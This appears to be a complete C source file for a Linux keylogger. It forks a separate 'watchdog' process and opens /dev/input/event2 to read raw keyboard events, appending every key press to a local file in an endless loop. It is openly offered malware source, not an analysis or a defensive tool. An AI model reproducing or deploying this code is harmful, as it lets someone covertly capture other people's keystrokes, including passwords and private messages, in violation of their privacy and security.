#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>

main() {
	printf("Starting keylogger\n");

	int piped[2];

	pipe(piped);

	pid_t pid = fork();

	if(pid == -1) {
		perror("Child couldn't be created\n");
		exit(1);
	}

	if(pid == 0) {
		close(piped[1]);
		char *watchdogName = "./build/watchdog.exe";

		char readPipe[10];
		sprintf(readPipe, "%d", piped[0]);

		char *args[3];
		args[0] = watchdogName;
		args[1] = readPipe;
		args[2] = NULL;

		execv(watchdogName, args);
	}
	else {
		if(fork() == 0) {
			close(piped[0]);

			int file;
			FILE *result;

			printf("Iniciando keylogger (%d)\n", getpid());

			file = open("/dev/input/event2", O_RDONLY);

			struct input_event ev;

			while(1) {
				read(file, &ev, sizeof(struct input_event));
				if(ev.type == EV_KEY) {
					if(ev.value == 1) {
						//printf(" : [key %i]\n", ev.code);
						result = fopen("./etc/keys.txt", "a+");
						fputc(ev.code, result);
						fclose(result);
					}
				}
			}
		}
	}
}